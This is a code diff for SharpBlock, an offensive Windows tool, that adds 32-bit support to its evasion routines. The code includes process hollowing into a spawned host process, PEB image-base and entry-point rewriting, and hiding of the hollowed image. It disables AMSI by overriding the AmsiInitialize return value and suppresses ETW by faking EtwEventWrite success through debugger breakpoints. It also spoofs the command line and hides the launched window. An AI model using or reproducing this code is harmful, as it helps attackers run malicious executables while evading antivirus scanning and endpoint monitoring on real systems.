@@ -130,30 +130,43 @@ namespace SharpBlock {
             return dllPath.ToString();
         }
 
-        static void OverrideReturnValue(IntPtr hThread, IntPtr hProcess, IntPtr value) {
+        static void OverrideReturnValue(IntPtr hThread, IntPtr hProcess, UIntPtr value, int numArgs) {
 
-            Context64 ctx = new Context64(ContextFlags.All);
+            Context ctx =  ContextFactory.Create(ContextFlags.All);
             ctx.GetContext(hThread);
 
             //Reads the memory for the current stack pointer to get the return address
             ctx.Ip = ctx.GetCurrentReturnAddress(hProcess);
-            //Restore the stack pointer to the prior state before the function was called
+
+            //Pop return address and restore the stack pointer to the prior state before the function was called
             ctx.PopStackPointer();
+
+            //x86 stdcall calling convention expects callee to pop
+            //arguments off the stack. x64 uses registers for first
+            //4 arguments.  TODO: adapt for 5+ arguments  
+            if (IntPtr.Size == 4) {
+                while (numArgs-- > 0) {
+                    ctx.PopStackPointer();
+                }
+            }
+
             //Set the result
-            ctx.SetResultRegister((ulong)value.ToInt64());
+            ctx.SetResultRegister(value.ToUInt64());
 
             ctx.SetContext(hThread);
         }
 
-        static IntPtr ReadRipRelRaxPointer(IntPtr hProcess, IntPtr address) {
+        static IntPtr ReadMovAddress(IntPtr hProcess, IntPtr address) {
 
             byte[] movIns = ReadBytes(hProcess, address, 3);
 
-            if (movIns.Equals(new byte[] { 0x48, 0x8b, 0x05 })) {
+            if (IntPtr.Size == 8 && movIns.SequenceEqual(new byte[] { 0x48, 0x8b, 0x05 })) {
+                return new IntPtr(address.ToInt64() + 7 + ReadType<Int32>(hProcess, new IntPtr(address.ToInt64() + 3)));
+            } else if(IntPtr.Size == 4 && movIns[0] == 0xA1){
+                return new IntPtr(ReadType<Int32>(hProcess, new IntPtr(address.ToInt64() + 1)));
+            } else {
                 return IntPtr.Zero;
-            }
-
-            return new IntPtr(address.ToInt64() + 7 + ReadType<Int32>(hProcess, new IntPtr(address.ToInt64() + 3)));
+            }            
         }
 
         static IntPtr WriteProgramArgs(IntPtr hProcess, string args) {
@@ -176,8 +189,8 @@ namespace SharpBlock {
         static void UpdateCommandLine(IntPtr hProcess, string args) {
 
             IntPtr kernel32Base = WinAPI.LoadLibrary("kernelbase.dll");
-            IntPtr commandLineArgsWPtr = ReadRipRelRaxPointer(hProcess, WinAPI.GetProcAddress(kernel32Base, "GetCommandLineW"));
-            IntPtr commandLineArgsAPtr = ReadRipRelRaxPointer(hProcess, WinAPI.GetProcAddress(kernel32Base, "GetCommandLineA"));
+            IntPtr commandLineArgsWPtr = ReadMovAddress(hProcess, WinAPI.GetProcAddress(kernel32Base, "GetCommandLineW"));
+            IntPtr commandLineArgsAPtr = ReadMovAddress(hProcess, WinAPI.GetProcAddress(kernel32Base, "GetCommandLineA"));
 
             if(commandLineArgsAPtr == IntPtr.Zero || commandLineArgsAPtr == IntPtr.Zero) {
                 Console.WriteLine("[-] Failed to updated GetCommandLine pointers, unexpected instruction present");
@@ -193,12 +206,12 @@ namespace SharpBlock {
 
         static void DisableAMSI(IntPtr hThread, IntPtr hProcess) {
             //Set result of AmsiInitialize to indicate disabled.
-            OverrideReturnValue(hThread, hProcess, new IntPtr(0x80070002));  
+            OverrideReturnValue(hThread, hProcess, new UIntPtr(0x80070002), 2);  
         }
 
         static void SetHardwareBreakpoint(IntPtr hThread, IntPtr address, int index) {
 
-            Context64 ctx = new Context64(ContextFlags.All);
+            Context ctx = ContextFactory.Create(ContextFlags.All);
             ctx.GetContext(hThread);
 
             if (ctx.Ip != (ulong)address.ToInt64()) {
@@ -215,7 +228,7 @@ namespace SharpBlock {
         }
 
         static void ClearHardwareBreakpoint(IntPtr thread, int index) {
-            Context64 ctx = new Context64(ContextFlags.Debug);
+            Context ctx = ContextFactory.Create(ContextFlags.Debug);
             ctx.GetContext(thread);
             ctx.ClearBreakpoint(index);
             ctx.SetContext(thread);
@@ -257,12 +270,13 @@ namespace SharpBlock {
             );
 
             IntPtr RemoteBaseAddress = new IntPtr((long)(PEINFO.Is32Bit ? PEINFO.OptHeader32.ImageBase : PEINFO.OptHeader64.ImageBase));
+
             pRemoteImage = Execute.DynamicInvoke.Native.NtAllocateVirtualMemory(
                 hProcess, ref RemoteBaseAddress, IntPtr.Zero, ref RegionSize,
                 Execute.Win32.Kernel32.MEM_COMMIT | Execute.Win32.Kernel32.MEM_RESERVE,
                 Execute.Win32.WinNT.PAGE_READWRITE
             );
-
+            
             // Write PE header to memory
             UInt32 SizeOfHeaders = PEINFO.Is32Bit ? PEINFO.OptHeader32.SizeOfHeaders : PEINFO.OptHeader64.SizeOfHeaders;
             UInt32 BytesWritten = Execute.DynamicInvoke.Native.NtWriteVirtualMemory((IntPtr)(-1), pImage, pModule, SizeOfHeaders);
@@ -281,6 +295,7 @@ namespace SharpBlock {
 
             //If allocated remote image base doesn't match PE header, process relocation table
             if (pRemoteImage != new IntPtr((long)(PEINFO.Is32Bit ? PEINFO.OptHeader32.ImageBase : PEINFO.OptHeader64.ImageBase))) {
+                Console.WriteLine($"[=] Could not map process to preferred image base 0x{ (PEINFO.Is32Bit ? PEINFO.OptHeader32.ImageBase : PEINFO.OptHeader64.ImageBase):x}, relocating to 0x{pRemoteImage.ToInt64():x}");
                 Map.RelocateModule(PEINFO, pImage, pRemoteImage);
             }
             Execute.DynamicInvoke.Native.NtWriteVirtualMemory(hProcess, pRemoteImage, pImage, (uint)RegionSize.ToInt32());
@@ -411,6 +426,11 @@ namespace SharpBlock {
 
         static void HideHollowedProcess(IntPtr hProcess, HostProcessInfo hpi) {
 
+            if(IntPtr.Size == 4) {
+                Console.WriteLine("[=] Hide allow process not available on x86 yet, use --disable-header-patch to supress this warning");
+                return;
+            }
+
             //Pull out the current image headers
             IMAGE_DOS_HEADER dosHeader = ReadType<IMAGE_DOS_HEADER>(hProcess, hpi.newLoadAddress);
             IMAGE_FILE_HEADER fileHeader = ReadType<IMAGE_FILE_HEADER>(hProcess, new IntPtr(hpi.newLoadAddress.ToInt64() + dosHeader.e_lfanew));
@@ -447,6 +467,46 @@ namespace SharpBlock {
             WriteType(hProcess, pebLdrData.InLoadOrderModuleListPtr.Flink, mainModule);
         }
 
+        static long GetProcessPEB(Context ctx) {
+            if(IntPtr.Size == 8) {
+                return ctx.GetRegister(3);
+            } else {
+                return ctx.GetRegister(1);
+            }
+        }
+
+        static long GetPreviousEntryPoint(Context ctx) {
+            if (IntPtr.Size == 8) {
+                return ctx.GetRegister(2);
+            } else {
+                return ctx.GetRegister(0);
+            }
+        }
+
+        static IntPtr GetPreviousLoadAddress(IntPtr hProcess, long peb) {
+            if (IntPtr.Size == 8) {
+                return ReadPointer(hProcess, new IntPtr(peb + 0x10));
+            } else {
+                return ReadPointer(hProcess, new IntPtr(peb + 0x8));
+            }
+        }
+
+        static void SetLoadAddress(IntPtr hProcess, long peb, IntPtr loadAddress) {
+            if (IntPtr.Size == 8) {
+                WritePointer(hProcess, new IntPtr(peb + 0x10), loadAddress);
+            } else {
+                WritePointer(hProcess, new IntPtr(peb + 0x8), loadAddress);
+            }
+        }
+
+        static void SetEntryPoint(Context ctx, IntPtr entryPoint) {
+            if (IntPtr.Size == 8) {
+                ctx.SetRegister(2, entryPoint.ToInt64());
+            } else {
+                ctx.SetRegister(0, entryPoint.ToInt32());
+            }
+        }
+
         static HostProcessInfo ReplaceExecutable(IntPtr hProcess, IntPtr hThread, string path) {
 
             //Map our executable into memory from the choosen source (file, web, pipe)
@@ -455,17 +515,18 @@ namespace SharpBlock {
             IntPtr entryPoint = MapExecutableMemory(LoadProcessData(path), hProcess, out remoteImage);
                    
             //Get the thread context of our newly launched host process
-            Context64 ctx = new Context64(ContextFlags.All);
-            ctx.GetContext(hThread);            
-            long peb = ctx.GetRegister(3);
+            Context ctx = ContextFactory.Create(ContextFlags.All);
+            ctx.GetContext(hThread);
+            long peb = GetProcessPEB(ctx);
 
             //Fill in some key information we need for later
-            hpi.previousEntryPoint = new IntPtr(ctx.GetRegister(2));
+            hpi.previousEntryPoint =  new IntPtr(GetPreviousEntryPoint(ctx));
             hpi.newEntryPoint = entryPoint;
             hpi.newLoadAddress = remoteImage;
             hpi.peb = new IntPtr(peb);
-            hpi.previousLoadAddress = ReadPointer(hProcess, new IntPtr(peb + 0x10));
-            
+            hpi.previousLoadAddress = GetPreviousLoadAddress(hProcess, peb);
+
+
             Console.WriteLine($"[+] PEB Address: 0x{peb:x16}");
             Console.WriteLine($"[+] Existing entry point: 0x{hpi.previousEntryPoint.ToInt64():x16}");
             Console.WriteLine($"[+] New entry point: 0x{entryPoint.ToInt64():x16}");
@@ -473,14 +534,31 @@ namespace SharpBlock {
             Console.WriteLine($"[+] New base: 0x{remoteImage.ToInt64():x16}");
 
             //Set RCX to the updated entry point of our new in memory PE
-            ctx.SetRegister(2, entryPoint.ToInt64());
+            SetEntryPoint(ctx, entryPoint);
             ctx.SetContext(hThread);
 
             //Write our new base address within PEB
-            WritePointer(hProcess, new IntPtr(peb + 0x10), remoteImage);
+            SetLoadAddress(hProcess, peb, remoteImage);
                        
             return hpi;
-        }   
+        }
+        
+        static DEBUG_EVENT GetDebugEvent(IntPtr nativeDebugEvent) {
+
+            WinAPI.DEBUG_EVENT result = new DEBUG_EVENT();
+
+            if (IntPtr.Size == 8) {
+                WinAPI.DEBUG_EVENT64 DebugEvent64 = (WinAPI.DEBUG_EVENT64)Marshal.PtrToStructure(nativeDebugEvent, typeof(WinAPI.DEBUG_EVENT64));
+                result.dwDebugEventCode = DebugEvent64.dwDebugEventCode;
+                result.dwProcessId = DebugEvent64.dwProcessId;
+                result.dwThreadId = DebugEvent64.dwThreadId;
+                result.u = DebugEvent64.u;
+            } else {
+                result = (WinAPI.DEBUG_EVENT)Marshal.PtrToStructure(nativeDebugEvent, typeof(WinAPI.DEBUG_EVENT));
+            }
+
+            return result;
+        }
         
         static void Main(string[] args) {
 
@@ -494,6 +572,7 @@ namespace SharpBlock {
             bool bypassHollowDetect = true;
             bool patchedArgs = false;
             bool kernelBaseLoaded = false;
+            bool showWindow = false;
             HostProcessInfo hpi = new HostProcessInfo();
 
             Console.WriteLine(
@@ -509,6 +588,7 @@ namespace SharpBlock {
                 .Add("p=|product=", "Product string to block", v => blockProduct.Add(v))
                 .Add("d=|description=", "Description string to block", v => blockDescription.Add(v))
                 .Add("s=|spawn=", "Host process to spawn for swapping with the target exe", v => hostProcess = v)
+                .Add("w|show", "Show the lauched process window instead of the default hide", v => showWindow = true )
                 .Add("disable-bypass-amsi", "Disable AMSI bypassAmsi", v => bypassAmsi = false)
                 .Add("disable-bypass-cmdline", "Disable command line bypass", v => bypassCommandLine = false)
                 .Add("disable-bypass-etw", "Disable ETW bypass", v => bypassETW = false)
@@ -545,24 +625,29 @@ namespace SharpBlock {
                 IntPtr stdErr;
                 IntPtr stdIn;
                 IntPtr currentProcess = new IntPtr(-1);
-                
+
                 WinAPI.DuplicateHandle(currentProcess, WinAPI.GetStdHandle(StdHandle.STD_OUTPUT_HANDLE), currentProcess, out stdOut, 0, true, 2);
                 WinAPI.DuplicateHandle(currentProcess, WinAPI.GetStdHandle(StdHandle.STD_ERROR_HANDLE), currentProcess, out stdErr, 0, true, 2);
                 WinAPI.DuplicateHandle(currentProcess, WinAPI.GetStdHandle(StdHandle.STD_INPUT_HANDLE), currentProcess, out stdIn, 0, true, 2);
 
                 STARTUPINFO startupInfo = new STARTUPINFO();
                 startupInfo.cb = (uint)Marshal.SizeOf(startupInfo);
-                startupInfo.dwFlags = 0x00000101;
-                startupInfo.hStdOutput = stdOut;
-                startupInfo.hStdError = stdErr;
-                startupInfo.hStdInput = stdIn;
+                uint launchFlags = WinAPI.DEBUG_PROCESS;
+
+                if (!showWindow) {
+                    startupInfo.dwFlags = 0x00000101;
+                    startupInfo.hStdOutput = stdOut;
+                    startupInfo.hStdError = stdErr;
+                    startupInfo.hStdInput = stdIn;
+                    launchFlags |= 0x08000000;
+                }
 
                 PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
 
                 string realProgramArgs = $"\"{hostProcess}\" {programArgs}";
                 string launchedArgs = bypassCommandLine ? $"\"{hostProcess}\"" : realProgramArgs;
 
-                if (!CreateProcess(hostProcess != null ? hostProcess : program, launchedArgs, IntPtr.Zero, IntPtr.Zero, true, WinAPI.DEBUG_PROCESS | 0x08000000, IntPtr.Zero, null,
+                if (!CreateProcess(hostProcess != null ? hostProcess : program, launchedArgs, IntPtr.Zero, IntPtr.Zero, true, launchFlags, IntPtr.Zero, null,
                     ref startupInfo, out pi)) {
                     Console.WriteLine($"[!] Failed to create process { (hostProcess != null ? hostProcess : program) } with error {Marshal.GetLastWin32Error()}");
                     return;
@@ -578,11 +663,11 @@ namespace SharpBlock {
                     bool bb = WinAPI.WaitForDebugEvent(debugEventPtr, 1000);
                     UInt32 dwContinueDebugEvent = WinAPI.DBG_CONTINUE;
                     if (bb) {
-                        WinAPI.DEBUG_EVENT DebugEvent = (WinAPI.DEBUG_EVENT)Marshal.PtrToStructure(debugEventPtr, typeof(WinAPI.DEBUG_EVENT));
+                        WinAPI.DEBUG_EVENT DebugEvent = GetDebugEvent(debugEventPtr);
                         IntPtr debugInfoPtr = GetIntPtrFromByteArray(DebugEvent.u);
                         switch (DebugEvent.dwDebugEventCode) {
 
-                            /* Uncomment if you want to see OutputDebugString output
+                            /* Uncomment if you want to see OutputDebugString output 
                             case WinAPI.OUTPUT_DEBUG_STRING_EVENT:
                                 WinAPI.OUTPUT_DEBUG_STRING_INFO OutputDebugStringEventInfo = (WinAPI.OUTPUT_DEBUG_STRING_INFO)Marshal.PtrToStructure(debugInfoPtr, typeof(WinAPI.OUTPUT_DEBUG_STRING_INFO));
                                 IntPtr bytesRead;
@@ -590,7 +675,7 @@ namespace SharpBlock {
                                 WinAPI.ReadProcessMemory(pi.hProcess, OutputDebugStringEventInfo.lpDebugStringData, strData, strData.Length, out bytesRead);
                                 Console.WriteLine(Encoding.ASCII.GetString(strData));
                                 break;
-                            */
+                            */                           
 
                             case WinAPI.CREATE_PROCESS_DEBUG_EVENT:
 
@@ -623,6 +708,8 @@ namespace SharpBlock {
                             case WinAPI.LOAD_DLL_DEBUG_EVENT:
                                 WinAPI.LOAD_DLL_DEBUG_INFO LoadDLLDebugInfo = (WinAPI.LOAD_DLL_DEBUG_INFO)Marshal.PtrToStructure(debugInfoPtr, typeof(WinAPI.LOAD_DLL_DEBUG_INFO));
                                 string dllPath = PatchEntryPointIfNeeded(LoadDLLDebugInfo.hFile, LoadDLLDebugInfo.lpBaseOfDll, processHandles[DebugEvent.dwProcessId]);
+
+                                //Console.WriteLine($"[=] DLL Load: {dllPath}");
 
                                 if (DebugEvent.dwProcessId == pi.dwProcessId) {
 
@@ -684,7 +771,7 @@ namespace SharpBlock {
 
                                     }else if(ExceptionDebugInfo.ExceptionRecord.ExceptionAddress == etwEventWritePtr) {
                                         //We have hit EtwEventWrite so lets just return with a fake success result
-                                        OverrideReturnValue(threadHandles[DebugEvent.dwThreadId], processHandles[DebugEvent.dwProcessId], new IntPtr(0));
+                                        OverrideReturnValue(threadHandles[DebugEvent.dwThreadId], processHandles[DebugEvent.dwProcessId], new UIntPtr(0), 5);
                                     }
 
                                 } else {
@@ -709,6 +796,7 @@ namespace SharpBlock {
 
             }catch(Exception e) {
                 Console.WriteLine($"[!] SharpBlock failed with error {e.Message}");
+                Console.WriteLine(e.StackTrace);
             }
         }
     }
